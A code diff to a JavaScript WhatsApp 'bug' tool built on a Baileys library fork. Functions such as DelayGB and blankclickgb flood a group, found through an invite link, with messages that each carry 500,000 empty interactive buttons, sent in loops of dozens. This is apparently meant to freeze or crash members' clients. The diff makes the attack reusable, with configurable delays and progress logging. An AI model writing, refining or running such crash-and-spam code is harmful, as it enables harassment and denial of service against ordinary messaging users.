@@ -1,5 +1,8 @@
 import { generateWAMessageFromContent } from "ourin-baileys";
 import { sleep, resolveGroupTarget, runGroupSpam } from "./helpers.js";
+import { BUG_DELAY_MS, makeProgressLogger } from "./progress.js";
+
+const BIG_BUTTONS = Array.from({ length: 500000 }, () => ({}));
 
 export async function DelayGB(sock, target) {
   for (let x = 0; x < 50; x++) {
@@ -20,7 +23,7 @@ export async function DelayGB(sock, target) {
               },
               body: { text: "izin @mexxreall" },
               nativeFlowMessage: {
-                buttons: Array.from({ length: 500000 }, () => ({})),
+                buttons: BIG_BUTTONS,
               },
             },
           },
@@ -75,30 +78,32 @@ export async function blankclickgb(sock, target) {
 export async function sendGroupBugFromLink(sock, link, combo = "delay", opts = {}) {
   const target = await resolveGroupTarget(sock, link);
   const totalLoop = opts.totalLoop ?? 55;
+  const delayMs = opts.delayMs ?? BUG_DELAY_MS;
+  const onProgress = makeProgressLogger(opts.logger, `group-${combo}`, totalLoop);
 
   const step = async (t) => {
     if (combo === "blank") {
       await blankclickgb(sock, t);
-      await sleep(500);
+      await sleep(delayMs);
       await blankclickgb(sock, t);
     } else if (combo === "combo") {
       await blankclickgb(sock, t);
-      await sleep(500);
+      await sleep(delayMs);
       await DelayGB(sock, t);
     } else {
       await DelayGB(sock, t);
-      await sleep(500);
+      await sleep(delayMs);
       await DelayGB(sock, t);
     }
-    await sleep(500);
   };
 
   return {
     target,
     ...(await runGroupSpam(sock, target, step, {
       totalLoop,
-      delayMs: 0,
+      delayMs,
       logger: opts.logger,
+      onProgress: (done) => onProgress(done),
     })),
   };
 }
